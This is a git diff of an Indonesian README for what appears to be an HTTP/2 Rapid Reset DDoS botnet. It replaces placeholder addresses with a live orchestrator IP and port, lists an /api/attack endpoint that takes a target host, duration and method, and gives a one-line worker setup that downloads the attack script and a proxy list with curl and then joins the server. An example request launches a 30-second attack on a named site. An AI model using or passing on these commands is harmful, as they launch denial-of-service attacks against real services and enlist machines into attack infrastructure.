@@ -36,6 +36,20 @@ Variabel lingkungan:
 | `HOST` | `0.0.0.0` | interface bind |
 | `CLIENT_TOKEN` | kosong | kalau diisi, worker wajib kirim header yang sama |
 
+## Server aktif
+
+Deployment yang sedang jalan:
+
+```
+http://204.10.194.164:3295
+```
+
+| Halaman | URL |
+| --- | --- |
+| dokumentasi | http://204.10.194.164:3295/ |
+| attack | http://204.10.194.164:3295/api/attack?host=&time=&method= |
+| workers | http://204.10.194.164:3295/api/workers |
+
 ## Setup client
 
 Satu baris, sudah termasuk `npm i hpack`:
@@ -46,19 +60,19 @@ mkdir -p bot && cd bot \
   && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/rapidreset.js \
   && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/proxi.txt \
   && npm i hpack --no-audit --no-fund \
-  && ORCHESTRATOR=http://IP:3295 node client.js
+  && ORCHESTRATOR=http://204.10.194.164:3295 node client.js
 ```
 
 Kalau server memakai `CLIENT_TOKEN`, tambahkan sebelum `node client.js`:
 
 ```bash
-CLIENT_TOKEN=rahasia ORCHESTRATOR=http://IP:3295 node client.js
+CLIENT_TOKEN=rahasia ORCHESTRATOR=http://204.10.194.164:3295 node client.js
 ```
 
 Worker tambahan di mesin lain cukup ulangi perintah yang sama. Multi-slot per mesin:
 
 ```bash
-MAX_CONCURRENT=2 ORCHESTRATOR=http://IP:3295 node client.js
+MAX_CONCURRENT=2 ORCHESTRATOR=http://204.10.194.164:3295 node client.js
 ```
 
 ## Endpoint
@@ -74,7 +88,7 @@ GET /api/attack?host=<url>&time=<detik>&method=<nama>
 | `method` | ya | nama dari `method.json` |
 
 ```bash
-curl "http://IP:3295/api/attack?host=https://example.com&time=30&method=rapidreset"
+curl "http://204.10.194.164:3295/api/attack?host=https://example.com&time=30&method=rapidreset"
 ```
 
 ```json
@@ -89,7 +103,7 @@ curl "http://IP:3295/api/attack?host=https://example.com&time=30&method=rapidres
 }
 ```
 
-Buka `http://IP:3295/` di browser untuk dokumentasi interaktif dengan tombol copy.
+Buka http://204.10.194.164:3295/ di browser untuk dokumentasi interaktif dengan tombol copy.
 
 Endpoint lain:
 
